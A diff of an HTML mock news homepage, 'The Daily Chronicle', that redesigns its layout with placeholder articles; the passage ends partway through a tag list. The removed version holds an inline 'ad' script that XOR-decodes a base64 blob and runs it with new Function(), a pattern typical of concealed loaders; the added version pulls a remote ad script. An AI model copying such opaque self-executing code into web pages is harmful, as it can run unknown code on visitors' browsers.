@@ -1,325 +1,688 @@
 <!DOCTYPE html>
 <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>The Daily Chronicle</title>
-        <style>
-            * {
-                box-sizing: border-box;
-                margin: 0;
-                padding: 0;
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>The Daily Chronicle</title>
+    <style>
+        :root {
+            --primary-color: #2563eb;
+            --secondary-color: #1e40af;
+            --text-color: #1f2937;
+            --light-text: #6b7280;
+            --bg-color: #f9fafb;
+            --card-bg: #ffffff;
+            --border-color: #e5e7eb;
+            --accent-color: #ef4444;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            line-height: 1.6;
+        }
+
+        header {
+            background-color: var(--card-bg);
+            border-bottom: 1px solid var(--border-color);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+
+        .header-container {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 1rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .date-badge {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 0.25rem 0.75rem;
+            border-radius: 9999px;
+            font-size: 0.875rem;
+            font-weight: 500;
+        }
+
+        .logo {
+            font-family: 'Playfair Display', Georgia, serif;
+            font-size: 2rem;
+            font-weight: 700;
+            color: var(--text-color);
+            text-decoration: none;
+        }
+
+        .logo span {
+            color: var(--primary-color);
+        }
+
+        .user-actions {
+            display: flex;
+            gap: 1rem;
+            align-items: center;
+        }
+
+        .user-actions a {
+            text-decoration: none;
+            color: var(--light-text);
+            font-size: 0.9rem;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+
+        .user-actions a:hover {
+            color: var(--primary-color);
+        }
+
+        .subscribe-btn {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 0.5rem 1rem;
+            border-radius: 0.375rem;
+            font-weight: 500;
+            transition: background-color 0.2s;
+        }
+
+        .subscribe-btn:hover {
+            background-color: var(--secondary-color);
+            color: white;
+        }
+
+        nav {
+            background-color: var(--card-bg);
+            padding: 0.75rem 0;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .nav-container {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 0 2rem;
+            display: flex;
+            gap: 2rem;
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+            scrollbar-width: none;
+        }
+
+        .nav-container::-webkit-scrollbar {
+            display: none;
+        }
+
+        nav a {
+            color: var(--text-color);
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 1rem;
+            padding-bottom: 0.25rem;
+            border-bottom: 2px solid transparent;
+            transition: border-color 0.2s, color 0.2s;
+            white-space: nowrap;
+        }
+
+        nav a:hover, nav a.active {
+            color: var(--primary-color);
+            border-bottom-color: var(--primary-color);
+        }
+
+        .main-content {
+            max-width: 1280px;
+            margin: 2rem auto;
+            padding: 0 2rem;
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 2rem;
+        }
+
+        .trending-section {
+            margin-bottom: 2rem;
+        }
+
+        .section-title {
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .section-title::before {
+            content: "";
+            display: inline-block;
+            width: 0.25rem;
+            height: 1.5rem;
+            background-color: var(--primary-color);
+            border-radius: 0.125rem;
+        }
+
+        .trending-grid {
+            display: grid;
+            grid-template-columns: repeat(1, 1fr);
+            gap: 1.5rem;
+        }
+
+        .featured-article {
+            background: var(--card-bg);
+            border-radius: 0.5rem;
+            overflow: hidden;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        .featured-article:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 10px 15px rgba(0,0,0,0.1);
+        }
+
+        .article-image {
+            width: 100%;
+            height: 240px;
+            background-color: #ddd;
+            background-position: center;
+            background-size: cover;
+        }
+
+        .article-content {
+            padding: 1.5rem;
+        }
+
+        .article-category {
+            display: inline-block;
+            padding: 0.25rem 0.5rem;
+            background-color: rgba(37, 99, 235, 0.1);
+            color: var(--primary-color);
+            font-size: 0.75rem;
+            font-weight: 600;
+            border-radius: 0.25rem;
+            margin-bottom: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .article-title {
+            font-size: 1.25rem;
+            font-weight: 700;
+            margin-bottom: 0.75rem;
+            line-height: 1.3;
+        }
+
+        .article-excerpt {
+            font-size: 1rem;
+            color: var(--light-text);
+            margin-bottom: 1rem;
+            display: -webkit-box;
+            -webkit-line-clamp: 3;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+        }
+
+        .article-meta {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 0.875rem;
+            color: var(--light-text);
+            margin-top: 1rem;
+            padding-top: 1rem;
+            border-top: 1px solid var(--border-color);
+        }
+
+        .author {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .author-avatar {
+            width: 2rem;
+            height: 2rem;
+            border-radius: 9999px;
+            background-color: #ddd;
+            background-position: center;
+            background-size: cover;
+        }
+
+        .news-grid {
+            display: grid;
+            grid-template-columns: repeat(1, 1fr);
+            gap: 1.5rem;
+        }
+
+        .sidebar {
+            background: var(--card-bg);
+            padding: 1.5rem;
+            border-radius: 0.5rem;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+        }
+
+        .sidebar-title {
+            font-size: 1.25rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 2px solid var(--border-color);
+        }
+
+        .news-list {
+            list-style-type: none;
+        }
+
+        .news-item {
+            padding: 0.75rem 0;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .news-item:last-child {
+            border-bottom: none;
+        }
+
+        .news-item a {
+            color: var(--text-color);
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.2s;
+            display: block;
+        }
+
+        .news-item a:hover {
+            color: var(--primary-color);
+        }
+
+        .news-item-meta {
+            font-size: 0.75rem;
+            color: var(--light-text);
+            margin-top: 0.25rem;
+        }
+
+        .tag-list {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+            margin-top: 1rem;
+        }
+
+        .tag {
+            background-color: var(--bg-color);
+            padding: 0.25rem 0.75rem;
+            border-radius: 9999px;
+            font-size: 0.75rem;
+            color: var(--light-text);
+            transition: background-color 0.2s, color 0.2s;
+        }
+
+        .tag:hover {
+            background-color: var(--primary-color);
+            color: white;
+        }
+
+        footer {
+            background-color: var(--text-color);
+            color: white;
+            padding: 3rem 2rem;
+            margin-top: 3rem;
+        }
+
+        .footer-container {
+            max-width: 1280px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(1, 1fr);
+            gap: 2rem;
+        }
+
+        .footer-logo {
+            font-family: 'Playfair Display', Georgia, serif;
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+        }
+
+        .footer-logo span {
+            color: var(--primary-color);
+        }
+
+        .footer-about {
+            color: #9ca3af;
+            margin-bottom: 1.5rem;
+        }
+
+        .footer-heading {
+            font-size: 1.125rem;
+            font-weight: 600;
+            margin-bottom: 1rem;
+        }
+
+        .footer-links {
+            list-style-type: none;
+        }
+
+        .footer-link {
+            margin-bottom: 0.5rem;
+        }
+
+        .footer-link a {
+            color: #9ca3af;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .footer-link a:hover {
+            color: white;
+        }
+
+        .footer-bottom {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding-top: 1.5rem;
+            border-top: 1px solid #374151;
+            font-size: 0.875rem;
+            color: #9ca3af;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+
+        /* Media Queries for Responsiveness */
+        @media (min-width: 640px) {
+            .trending-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        @media (min-width: 768px) {
+            .main-content {
+                grid-template-columns: 2fr 1fr;
             }
 
-            body {
-                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-                background-color: #f8f9fa;
-                color: #1a1a1a;
-                line-height: 1.6;
+            .trending-section {
+                grid-column: 1 / -1;
             }
 
-            header {
-                background-color: #1a1a1a;
-                color: #fff;
-                padding: 12px 0;
-                border-bottom: 3px solid #c41e3a;
+            .news-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .trending-grid {
+                grid-template-columns: repeat(3, 1fr);
             }
 
+            .footer-container {
+                grid-template-columns: repeat(4, 1fr);
+            }
+        }
+
+        @media (max-width: 639px) {
             .header-container {
-                max-width: 1200px;
-                margin: 0 auto;
-                padding: 0 20px;
-            }
-
-            .header-top {
-                display: flex;
-                justify-content: space-between;
-                align-items: center;
-                margin-bottom: 10px;
-            }
-
-            .date {
-                font-size: 0.9rem;
-                color: #888;
-            }
-
-            .logo {
-                font-family: Georgia, serif;
-                font-size: 2.5rem;
-                font-weight: bold;
+                flex-direction: column;
+                gap: 1rem;
                 text-align: center;
-                margin: 10px 0;
+                padding: 1rem;
             }
 
-            nav {
-                background-color: #333;
-                padding: 10px 0;
+            .user-actions {
+                width: 100%;
+                justify-content: center;
             }
 
             .nav-container {
-                max-width: 1200px;
-                margin: 0 auto;
-                padding: 0 20px;
-                display: flex;
-                gap: 25px;
-            }
-
-            nav a {
-                color: #fff;
-                text-decoration: none;
-                font-weight: 500;
-                font-size: 0.95rem;
-                transition: color 0.2s;
-            }
-
-            nav a:hover {
-                color: #c41e3a;
+                padding: 0 1rem;
+                gap: 1.5rem;
             }
 
             .main-content {
-                max-width: 1200px;
-                margin: 20px auto;
-                padding: 0 20px;
-                display: grid;
-                grid-template-columns: 2fr 1fr;
-                gap: 30px;
-            }
-
-            .featured-article {
-                background: #fff;
-                padding: 20px;
-                border-radius: 4px;
-                box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+                padding: 0 1rem;
+                margin: 1.5rem auto;
             }
 
             .article-title {
-                font-size: 2rem;
-                font-weight: bold;
-                margin-bottom: 15px;
-                line-height: 1.2;
+                font-size: 1.125rem;
             }
-
-            .article-meta {
-                font-size: 0.9rem;
-                color: #666;
-                margin-bottom: 15px;
-            }
-
-            .article-content {
-                font-size: 1.1rem;
-                line-height: 1.7;
-            }
-
-            .sidebar {
-                background: #fff;
-                padding: 20px;
-                border-radius: 4px;
-                box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-            }
-
-            /* Ad Styles */
-            .yepper-ad-container {
-                width: 100%;
-                background: #ffffff;
-                border-radius: 4px;
-                box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-                margin-bottom: 20px;
-            }
-
-            .yepper-ad-item {
-                width: 100%;
-                padding: 12px;
-            }
-
-            .yepper-ad-image-wrapper {
-                width: 100%;
-                position: relative;
-                padding-top: 56.25%;
-                overflow: hidden;
-                border-radius: 4px;
-                background: #f8f8f8;
-            }
-
-            .yepper-ad-image {
-                position: absolute;
-                top: 0;
-                left: 0;
-                width: 100%;
-                height: 100%;
-                object-fit: cover;
-            }
-
-            .yepper-ad-empty {
-                padding: 20px;
-                text-align: center;
-                color: #666;
-            }
-        </style>
-    </head>
-    <body>
-        <header>
-            <div class="header-container">
-                <div class="header-top">
-                    <div class="date">Monday, January 27, 2025</div>
-                    <div>Subscribe | Sign In</div>
-                </div>
-                <div class="logo">The Daily Chronicle</div>
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="header-container">
+            <div class="date-badge">Monday, March 3, 2025</div>
+            <a href="#" class="logo">The <span>Daily</span> Chronicle</a>
+            <div class="user-actions">
+                <a href="#">Sign In</a>
+                <a href="#" class="subscribe-btn">Subscribe</a>
             </div>
-        </header>
-        
+        </div>
         <nav>
             <div class="nav-container">
-                <a href="#">Home</a>
+                <a href="#" class="active">Home</a>
                 <a href="#">Politics</a>
                 <a href="#">Business</a>
                 <a href="#">Technology</a>
+                <a href="#">Science</a>
+                <a href="#">Health</a>
                 <a href="#">World</a>
                 <a href="#">Sports</a>
+                <a href="#">Entertainment</a>
                 <a href="#">Opinion</a>
             </div>
         </nav>
+    </header>
 
-        <div class="main-content">
-            <div class="featured-article">
-                <h1 class="article-title">Global Tech Summit Opens Amid AI Innovation Surge</h1>
-                <div class="article-meta">
-                    By Sarah Chen | Technology Correspondent | 2 hours ago
+    <div class="main-content">
+        <div class="trending-section">
+            <h2 class="section-title">Trending Today</h2>
+            <div class="trending-grid">
+                <div class="featured-article">
+                    <div class="article-image" style="background-image: url('/api/placeholder/600/400')"></div>
+                    <div class="article-content">
+                        <span class="article-category">Technology</span>
+                        <h3 class="article-title">Global Tech Summit Opens Amid AI Innovation Surge</h3>
+                        <p class="article-excerpt">The world's largest technology conference opened its doors today in Silicon Valley, with artificial intelligence taking center stage as industry leaders gather to showcase breakthrough innovations.</p>
+                        <div class="article-meta">
+                            <div class="author">
+                                <div class="author-avatar" style="background-image: url('/api/placeholder/40/40')"></div>
+                                <div>Sarah Chen</div>
+                            </div>
+                            <div>2 hours ago</div>
+                        </div>
+                    </div>
                 </div>
-                <div class="article-content">
-                    <p>The world's largest technology conference opened its doors today in Silicon Valley, with artificial intelligence taking center stage as industry leaders gather to showcase breakthrough innovations that promise to reshape the future of computing.</p>
-                    <p>Major tech companies are expected to unveil new AI-powered products and services, while addressing growing concerns about safety and regulation in the rapidly evolving sector.</p>
+                <div class="featured-article">
+                    <div class="article-image" style="background-image: url('/api/placeholder/600/400')"></div>
+                    <div class="article-content">
+                        <span class="article-category">Business</span>
+                        <h3 class="article-title">Markets Rally Following Strong Economic Data</h3>
+                        <p class="article-excerpt">Global markets showed significant gains this week following the release of better-than-expected employment numbers and consumer spending data from major economies.</p>
+                        <div class="article-meta">
+                            <div class="author">
+                                <div class="author-avatar" style="background-image: url('/api/placeholder/40/40')"></div>
+                                <div>Michael Rodriguez</div>
+                            </div>
+                            <div>4 hours ago</div>
+                        </div>
+                    </div>
+                </div>
+                <div class="featured-article">
+                    <div class="article-image" style="background-image: url('/api/placeholder/600/400')"></div>
+                    <div class="article-content">
+                        <span class="article-category">Science</span>
+                        <h3 class="article-title">Climate Summit Reaches Historic Carbon Agreement</h3>
+                        <p class="article-excerpt">World leaders have agreed on ambitious new targets to reduce carbon emissions after two weeks of intense negotiations at the annual climate summit.</p>
+                        <div class="article-meta">
+                            <div class="author">
+                                <div class="author-avatar" style="background-image: url('/api/placeholder/40/40')"></div>
+                                <div>Emma Wilson</div>
+                            </div>
+                            <div>6 hours ago</div>
+                        </div>
+                    </div>
                 </div>
             </div>
-            
-            <div class="sidebar">
-                <script>
+        </div>
 
-                    (function(){
-                      const _k='jyn8FZbNFAtXvYG9BQY/P1PsrRWrWJ5N7zPQHgu2FzY=';
-                      const _d='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';
-                      
-                      const _dec=(str,key)=>{
-                        const decoded=atob(str);
-                        let result='';
-                        for(let i=0;i<decoded.length;i++){
-                          const keyChar=key.charCodeAt(i%key.length);
-                          const strChar=decoded.charCodeAt(i);
-                          result+=String.fromCharCode(strChar^keyChar);
-                        }
-                        return result;
-                      };
-                
-                      try {
-                        const script=_dec(_d,_k);
-                        const f=new Function(script);
-                        f();
-                      } catch(e) {
-                        console.error('Ad script initialization error:',e);
-                        if(document.currentScript) {
-                          const container = document.createElement('div');
-                          container.className = 'yepper-ad-wrapper';
-                          document.currentScript.parentNode.insertBefore(container, document.currentScript);
-                          container.innerHTML = `
-                            <div class="yepper-ad-empty">
-                              <div class="yepper-ad-empty-title">Advertisement</div>
-                              <div class="yepper-ad-empty-text">Unable to load advertisement</div>
-                            </div>
-                          `;
-                        }
-                      }
-                    })();
-                </script>
-                <h2>Breaking News</h2>
-                <ul>
-                    <li>Markets Rally on Strong Economic Data</li>
-                    <li>Climate Summit Reaches Historic Agreement</li>
-                    <li>New Medical Breakthrough in Cancer Research</li>
+        <div class="news-grid">
+            <div class="featured-article">
+                <div class="article-image" style="background-image: url('/api/placeholder/600/400')"></div>
+                <div class="article-content">
+                    <span class="article-category">Health</span>
+                    <h3 class="article-title">Breakthrough in Cancer Research Offers New Treatment Hope</h3>
+                    <p class="article-excerpt">Scientists have identified a novel approach to targeting cancer cells that could lead to more effective treatments with fewer side effects, according to a study published today.</p>
+                    <div class="article-meta">
+                        <div class="author">
+                            <div class="author-avatar" style="background-image: url('/api/placeholder/40/40')"></div>
+                            <div>Dr. James Parker</div>
+                        </div>
+                        <div>8 hours ago</div>
+                    </div>
+                </div>
+            </div>
+            <div class="featured-article">
+                <div class="article-image" style="background-image: url('/api/placeholder/600/400')"></div>
+                <div class="article-content">
+                    <span class="article-category">Sports</span>
+                    <h3 class="article-title">Underdog Team Stuns Defending Champions in Overtime Thriller</h3>
+                    <p class="article-excerpt">In what analysts are calling one of the biggest upsets of the season, the underdogs pulled off a remarkable comeback victory against the reigning champions in a nail-biting overtime finish.</p>
+                    <div class="article-meta">
+                        <div class="author">
+                            <div class="author-avatar" style="background-image: url('/api/placeholder/40/40')"></div>
+                            <div>Jason Thompson</div>
+                        </div>
+                        <div>12 hours ago</div>
+                    </div>
+                </div>
+            </div>
+            <div class="featured-article">
+                <div class="article-image" style="background-image: url('/api/placeholder/600/400')"></div>
+                <div class="article-content">
+                    <span class="article-category">World</span>
+                    <h3 class="article-title">Historic Peace Agreement Signed After Decades of Conflict</h3>
+                    <p class="article-excerpt">After years of diplomatic negotiations, leaders from two long-standing rival nations have signed a comprehensive peace agreement that promises to end decades of tensions and establish new cooperation.</p>
+                    <div class="article-meta">
+                        <div class="author">
+                            <div class="author-avatar" style="background-image: url('/api/placeholder/40/40')"></div>
+                            <div>Alexandra Kim</div>
+                        </div>
+                        <div>Yesterday</div>
+                    </div>
+                </div>
+            </div>
+            <div class="featured-article">
+                <div class="article-image" style="background-image: url('/api/placeholder/600/400')"></div>
+                <div class="article-content">
+                    <span class="article-category">Entertainment</span>
+                    <h3 class="article-title">Award-Winning Director Announces Groundbreaking New Film Project</h3>
+                    <p class="article-excerpt">The acclaimed filmmaker revealed details about an ambitious new project that will utilize cutting-edge technology to create an immersive storytelling experience unlike anything seen before.</p>
+                    <div class="article-meta">
+                        <div class="author">
+                            <div class="author-avatar" style="background-image: url('/api/placeholder/40/40')"></div>
+                            <div>Olivia Martinez</div>
+                        </div>
+                        <div>Yesterday</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="sidebar">
+            <h3 class="sidebar-title">Latest News</h3>
+            <ul class="news-list">
+                <li class="news-item">
+                    <a href="#">New Renewable Energy Plant Becomes Operational, Powering 50,000 Homes</a>
+                    <div class="news-item-meta">30 minutes ago</div>
+                </li>
+                <li class="news-item">
+                    <a href="#">Central Bank Announces Interest Rate Decision Following Policy Meeting</a>
+                    <div class="news-item-meta">1 hour ago</div>
+                </li>
+                <script src="https://yepper-backend.onrender.com/api/ads/script/67c5e8aa5e3ecf7463378fbf"></script>
+                <li class="news-item">
+                    <a href="#">Major Airline Unveils Fleet Expansion Plan and New International Routes</a>
+                    <div class="news-item-meta">3 hours ago</div>
+                </li>
+                <li class="news-item">
+                    <a href="#">Startup Raises Record Funding for Innovative Urban Transportation Solution</a>
+                    <div class="news-item-meta">5 hours ago</div>
+                </li>
+                <li class="news-item">
+                    <a href="#">International Education Report Shows Shifting Trends in Student Performance</a>
+                    <div class="news-item-meta">7 hours ago</div>
+                </li>
+            </ul>
+
+            <h3 class="sidebar-title" style="margin-top: 2rem;">Popular Topics</h3>
+            <div class="tag-list">
+                <a href="#" class="tag">Climate Change</a>
+                <a href="#" class="tag">Artificial Intelligence</a>
+                <a href="#" class="tag">Global Economy</a>
